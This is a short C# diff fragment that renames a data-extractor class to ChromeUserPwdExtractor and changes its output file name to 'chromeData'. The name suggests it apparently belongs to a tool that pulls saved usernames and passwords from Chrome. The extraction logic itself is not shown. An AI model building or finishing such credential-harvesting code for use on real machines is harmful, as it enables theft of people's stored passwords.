@@ -7,12 +7,12 @@ using System.Collections.Generic;
 
 namespace TP
 {
-    public class BrowserDataExtractor : DataExtractor
+    public class ChromeUserPwdExtractor : DataExtractor
     {
 
-        public BrowserDataExtractor()
+        public ChromeUserPwdExtractor()
         {
-            fileName = "browserData";
+            fileName = "chromeData";
         }
 
         protected override string ExtractData()
